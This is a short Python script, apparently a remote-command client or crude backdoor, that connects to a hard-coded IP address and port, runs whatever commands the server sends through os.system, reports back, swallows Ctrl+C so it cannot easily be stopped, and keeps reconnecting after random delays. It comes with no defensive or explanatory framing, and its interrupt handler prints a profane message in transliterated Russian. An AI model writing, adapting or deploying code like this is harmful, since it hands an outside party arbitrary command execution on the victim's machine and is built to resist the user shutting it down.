import socket
import os
import random
import time


class CommandFIlter:
    def __init__(self):
        pass # тут уже добавь

host = '26.199.90.194'
port = 12345
calc = "C:/Windows/System32/calc.exe"
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


client_socket.connect((host, port))

print("Client started...")

while True:
    try:
        data = client_socket.recv(1024)
        server_answer = data.decode().split()
        if server_answer[0]=='run':
            if server_answer[1]=='-s':
                is_system = "C:/Windows/System32/"+server_answer[2]
                os.system(is_system)
                answer_for_server = f"RUN: {server_answer[2]}"
                
            else:
                os.system(server_answer[1])
                answer_for_server = f"RUN: {server_answer[1]}"
                
        client_socket.send(answer_for_server.encode())

    except KeyboardInterrupt:
        print("Blya menya etim hetel vikluchit? Dolbaeb")
    except socket.error as e:
        print(f"Error: {e}")
        print("sleep")
        time.sleep(random.randint(0, 10))
        client_socket.connect((host, port))
        print("unsleep")

client_socket.close()